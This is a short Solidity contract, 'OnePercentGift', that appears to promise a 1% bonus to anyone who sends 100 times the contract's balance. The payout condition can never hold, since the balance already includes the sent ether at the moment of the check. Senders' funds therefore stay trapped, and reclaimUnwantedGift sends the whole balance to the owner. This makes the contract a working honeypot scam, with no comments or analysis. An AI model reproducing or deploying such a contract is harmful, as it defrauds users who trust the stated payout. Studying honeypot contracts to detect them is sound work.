pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{

	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value * 101);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}